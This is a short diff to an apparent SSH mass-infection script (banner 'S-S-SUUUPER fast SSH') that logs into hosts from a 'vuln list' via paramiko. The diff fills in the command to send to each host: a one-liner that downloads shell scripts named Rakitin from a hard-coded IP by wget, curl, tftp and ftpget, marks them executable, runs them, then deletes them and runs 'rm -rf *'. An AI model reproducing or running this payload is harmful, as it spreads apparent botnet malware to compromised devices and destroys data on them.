@@ -10,7 +10,7 @@ if len(sys.argv) < 2:
     sys.exit("\033[37mUsage: python "+sys.argv[0]+" [vuln list]")
  
 paramiko.util.log_to_file("/dev/null")
-rekdevice="payload" #command to send
+rekdevice="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://2.58.149.158/Rakitin.sh; curl -O http://2.58.149.158/Rakitin.sh; chmod 777 Rakitin.sh; sh Rakitin.sh; tftp 2.58.149.158 -c get Rakitin.sh; chmod 777 Rakitin.sh; sh Rakitin.sh; tftp -r Rakitin2.sh -g 2.58.149.158; chmod 777 Rakitin2.sh; sh Rakitin2.sh; ftpget -v -u anonymous -p anonymous -P 21 2.58.149.158 Rakitin1.sh Rakitin1.sh; sh Rakitin1.sh; rm -rf Rakitin.sh Rakitin.sh Rakitin2.sh Rakitin1.sh; rm -rf *" #command to send
 print "\033[31m"
  
 print "S-S-SUUUPER fast SSH "
